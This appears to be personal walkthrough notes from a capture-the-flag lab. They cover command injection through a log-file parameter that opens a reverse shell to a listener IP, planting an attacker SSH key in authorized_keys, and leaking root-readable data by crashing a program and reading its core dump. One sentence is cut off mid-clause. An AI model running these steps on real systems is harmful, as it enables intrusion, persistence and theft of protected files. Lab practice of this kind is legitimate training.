Command to pop a reverse shell: ```/bin/bash -c "bash -i >& /dev/tcp/10.10.15.30/443 0>&1"```
Request: ```GET /api/logs?file=index;/bin/bash+-c+"bash+-i+>%26+/dev/tcp/10.10.15.30/443+0>%261" HTTP/1.1```

Generate ssh key for remote authentication without a password: ```ssh-keygen -t rsa -b 4096```

This generates a public and privatekey to ~/.ssh
- Private key file: id_rsa
- Public key file: id_rsa.pub

Copy id_rsa.pub to clipboard and paste with the following command:

Copy id_rsa.pub to remote authorized_keys file: ```echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC+88CT+6BjetCEI6h4SXyt/JzyLWyRbNn2dj7Nae5neG9FnstjEC6s3MHgXbsVVRFWWb+J6VNoSe02o5Gh761TgB3MLoIf4CUoQoFmoyj6rql4z7klYd3iLYeZ1kNoFeCMtboI90LRjpF4CT/CnQLX5zSjZD6gCPDlRXE7Xgw2
VF/FPtcB9kPA+PtlZSey6DX2cC6Z0wapuR1x8V3cwmFRyvDCp6NgGOwfeIYc0qhBa0NAWA8mfxKZI7uyZChxrUNKbmy60aOfaxW0LZ6xWkM8Fj0Mb9J6ZE+V9EhSMxnV+hWsO776d42zOsDPn/t9WYYw8X8TcHqwziVCew+zHgzr2XC5XywPOwj1pBf0j3cWvP95zxIBSWmMK0YMVW5aL5+l0aMjBGFLEeRws9LEOzER
mxnOgwC7ALDJTyESfwDWVSh99CGSDWZBc48QQ3oeon6TNemAjFzijfW0FeyrgcbZhqG55gmUyfHs7FEi7hWapF1qQygBUvz2wcCIvrSsPLJ/N7hTmbkIa4kSLqAcL2NQRtXBt+SAivXzkHrmzF3289IAc9L1w/rHqCV3TKpSgoppCGRyQZlOXyd3irt4MVY2IVrI2WW9lgXsbTRFv7fH5FcRcP7oHEwr3mBE5y4Rt46j
SEx4NyfprsJZPBmSnAUj/rZv2X8w3LUbUuo+Qs+o0Q== kali@kali' >> authorized_users                                           
<2X8w3LUbUuo+Qs+o0Q== kali@kali' >> authorized_keys```

Check /opt directory to find "count" program thats runnable by the current user.
Run the program and see that it analyzes files accessible by root.
Analyze the code file "code.c" within the same directory to see the following lines: 
![[Attachments/Pasted image 20220305164945.png]]
Upon researching the prctl() function we learn that PR_SET_DUMPABLE being set to 1 makes it so that 
When running the program again, background it when asked ```Save results a file? [y/N]:```
Kill the background process with the command ```kill -SIGSEGV 3925```
Then foreground it with the command ```fg```
Find the crash file inside of "/var/crash" and analyze it by running the command ```apport-unpack /var/crash/_opt_count.1000.crash /dev/shm/1```
Then run strings on this output with the command ```strings /dev/shm/1/CoreDump```

Tools Used:
- Burp Suite (craft requests)
- Curl (craft requests)
- jwt.io (verify web-token)
- Reverse Shell Generator
- apport-unpack 